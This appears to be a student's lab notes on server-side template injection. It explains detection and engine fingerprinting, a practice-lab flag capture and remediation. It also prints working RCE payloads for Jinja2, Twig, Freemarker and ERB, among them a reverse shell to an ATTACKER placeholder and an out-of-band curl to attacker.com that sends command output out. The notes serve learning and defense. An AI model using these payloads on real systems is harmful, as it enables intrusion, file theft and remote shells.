# Day 18 – | Server-Side Template Injection (SSTI)

**Topic:** Detection & Fingerprinting, Common RCE payloads, Engines

**Date:** Saturday May 17, 2026

---

## What is SSTI?

Server-Side Template Injection (SSTI) occurs when user-controlled input is embedded **directly** into a server-side template and evaluated by the template engine — instead of being treated as static data. If the engine processes the input as code, the attacker gains arbitrary expression evaluation on the server.

Template engines (Jinja2, Twig, Freemarker, etc.) are designed to render dynamic content by evaluating expressions like `{{ variable }}` or `<%= value %>`. SSTI exploits this evaluation mechanism.

---

## How It Happens

Normal (safe) use:
```
template = "Hello, {{ name }}!"
render(template, name=user_input)   # input never touches the template string
```

Vulnerable use:
```
template = f"Hello, {user_input}!"
render(template)                    # input IS the template — engine evaluates it
```

If `user_input` is `{{ 7*7 }}`, the safe version outputs `{{ 7*7 }}` literally. The vulnerable version outputs `49` — the engine evaluated it.

---

## Detection & Fingerprinting

### Step 1 – Probe with arithmetic
| Payload | Output | Engine |
|---------|--------|--------|
| `{{7*7}}` | `49` | Jinja2 / Twig |
| `${7*7}` | `49` | Freemarker / Velocity |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `#{7*7}` | `49` | Pebble / Smarty |

### Step 2 – Engine fingerprint
Send `{{7*'7'}}`:
- Jinja2 → `7777777` (repeats string)
- Twig → `49` (numeric multiply)

### Decision Tree (simplified)
```
Does {{7*7}} → 49?
  Yes → Jinja2 / Twig family
    Does {{7*'7'}} → 7777777? → Jinja2 (Python)
    Does {{7*'7'}} → 49?      → Twig (PHP)
  No  → Try ${7*7}, #{7*7}, <%= 7*7 %>
```

---

## Exploitation – Jinja2 (Python / Flask)

### Why `config` works
In Flask, `config` is a global automatically injected into Jinja2's template context. It's a Python object, so we can traverse its class hierarchy to reach `os`.

### Payload chain breakdown
```
{{ config.__class__                          # <class 'flask.config.Config'>
         .__init__                           # Config's __init__ method
         .__globals__                        # all globals of that function
         ['os']                              # the os module
         .popen('id')                        # run shell command
         .read() }}                          # read stdout
```

### Common RCE payloads

```jinja
{{- Confirm RCE -}}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

{{- List directory -}}
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}

{{- Read a file -}}
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}

{{- Reverse shell (example) -}}
{{ config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER/4444 0>&1').read() }}
```

### Alternative (no `config` in context)
```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
This dumps all Python subclasses. From there you can hunt for `subprocess.Popen`, `os._wrap_close`, or `_io.FileIO` to execute commands.

---

## Exploitation – Other Engines

### Twig (PHP)
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("id") }
```

### ERB (Ruby)
```erb
<%= `id` %>
```

---

## Blind SSTI

When output is not reflected, use out-of-band techniques:

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/?x=$(id)').read() }}
```

You receive the result in your HTTP server logs even if the page shows nothing.

---

## Attack Chain – ReportGen v2.1 Lab

| Step | Action | Result |
|------|--------|--------|
| 1 | `{{7*7}}` in `name` param | Outputs `49` → SSTI confirmed (Jinja2) |
| 2 | Enumerate filesystem with `os.popen('ls /')` | Root dirs visible |
| 3 | List `/root` and `/home` | Found `root.txt`, `user.txt` |
| 4 | `cat /home/labuser/user.txt` | `flag{ssti_jinja2_rce_template_injection}` |
| 5 | `cat /root/root.txt` | `flag{root_via_sudo_find}` |

URL format used:
```
http://45.56.112.197:30561/report?name={{PAYLOAD}}
```

---

## Impact

SSTI → **Remote Code Execution (RCE)**. An attacker can:
- Read arbitrary files (credentials, keys, source code)
- Execute system commands
- Establish reverse shells
- Pivot to internal network

SSTI is often rated **Critical** (CVSS ≥ 9.0) because it directly achieves code execution on the server.

---

## Remediation

| Fix | Detail |
|-----|--------|
| Never pass user input as a template | Render data *into* a template, not the template itself |
| Use sandboxed rendering | Jinja2's `SandboxedEnvironment` restricts dangerous attributes |
| Input validation / allowlisting | Reject `{{`, `}}`, `{%`, `${}` in user input |
| Disable dangerous globals | Remove `os`, `subprocess`, `__builtins__` from the template context |
| Least privilege | Don't run the web server as root |

---

## Activities

- **Research:** SSTI deep-dive research prepared and presented to the class.
- **Challenge:** ReportGen v2.1 SSTI lab — exploited Jinja2 RCE via `config.__class__.__init__.__globals__['os'].popen()` to capture both user and root flags.

